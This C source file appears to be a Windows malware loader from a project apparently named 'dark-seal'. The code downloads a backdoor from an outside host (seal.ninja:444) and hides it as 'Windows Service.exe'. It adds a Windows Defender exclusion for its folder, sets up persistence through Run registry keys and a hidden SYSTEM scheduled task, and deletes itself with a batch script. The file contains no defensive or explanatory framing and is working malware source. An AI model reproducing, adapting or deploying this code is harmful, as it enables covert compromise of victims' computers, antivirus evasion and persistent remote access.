#include "headers.h"

char *download_backdoor(char *appdata_path){

    char *backdoor_path = malloc(sizeof(char) * MAX_PATH);
    sprintf(backdoor_path, "%s\\Windows", appdata_path);
    
    CreateDirectory(backdoor_path, NULL);
    sprintf(backdoor_path, "%s\\Windows Service.exe", backdoor_path);

    URLDownloadToFile(NULL, "http://seal.ninja:444/b/backdoor.exe", backdoor_path, 0, NULL);
    return backdoor_path;
}

HANDLE create_mutex(){

    HANDLE mutex = CreateMutex(NULL, TRUE, "Global\\dark-seal.mutex");
    int last_error = GetLastError();
    if (last_error == ERROR_ALREADY_EXISTS || last_error == ERROR_ACCESS_DENIED){
    	CloseHandle(mutex);
        return NULL;
    }
    return mutex;
}

void destroy_mutex(HANDLE mutex){
    CloseHandle(mutex);
}

void self_delete(char *loader_path){

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    const char *batch = "@echo off\nset module=\%1\n:repeat\ndel \%module\%\nif exist \%module\% goto repeat\ndel \%0";

    char tmp_path[MAX_PATH];
    GetTempPath(MAX_PATH, tmp_path);

    strcat(tmp_path, "del.bat");

    FILE *f = fopen(tmp_path, "w");
    fwrite(batch, sizeof(char), strlen(batch), f);
    fclose(f);

    char *command = malloc(sizeof(char) * (strlen(tmp_path) + strlen(loader_path) + 18));
    sprintf(command, "cmd.exe /C %s %s", tmp_path, loader_path);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(NULL, command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    free(command);
}

void start_backdoor(char *backdoor_path){

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (is_elevated()) {
        CreateProcess(NULL, "powershell.exe -exec bypass -c \"Start-ScheduledTask -TaskName 'Windows Service' -TaskPath '\\Microsoft\\Windows\\Windows Services'\"", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    else {
        CreateProcess(NULL, backdoor_path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }

    free(backdoor_path);
}

void exclude(char* appdata_path) {

    char exclusion[512];
    char backdoor_path[MAX_PATH];

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    sprintf(backdoor_path, "%s\\Windows", appdata_path);
    sprintf(exclusion, "powershell.exe -exec bypass -Command Add-MpPreference -ExclusionPath '%s'", backdoor_path);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(NULL, exclusion, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

}

void persistence(char *backdoor_path){
	
    char schtask[512];

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HKEY h_key;
	
    sprintf(schtask, "powershell.exe -exec bypass -c \"$action = New-ScheduledTaskAction -Execute '%s';$trigger = New-ScheduledTaskTrigger -AtStartup;$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -Compatibility Win8; Register-ScheduledTask -Action $action -Trigger $trigger -User 'SYSTEM' -TaskName 'Windows Service' -Settings $settings -TaskPath '\\Microsoft\\Windows\\Windows Services'\"", backdoor_path);

    if (is_elevated()) {
        RegCreateKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &h_key, NULL);
        RegSetValueExA(h_key, "Windows Service", 0, REG_SZ, (const BYTE*)backdoor_path, strlen(backdoor_path));

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        CreateProcess(NULL, schtask, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &h_key, NULL);
        RegSetValueExA(h_key, "Windows Service", 0, REG_SZ, (const BYTE*)backdoor_path, strlen(backdoor_path));
    }
    
	RegCloseKey(h_key);
}

BOOL is_elevated() {
    BOOL ret = FALSE;
    HANDLE h_token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h_token)) {
        TOKEN_ELEVATION elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(h_token, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
            ret = elevation.TokenIsElevated;
        }
    }
    if (h_token) {
        CloseHandle(h_token);
    }

    return ret;
}
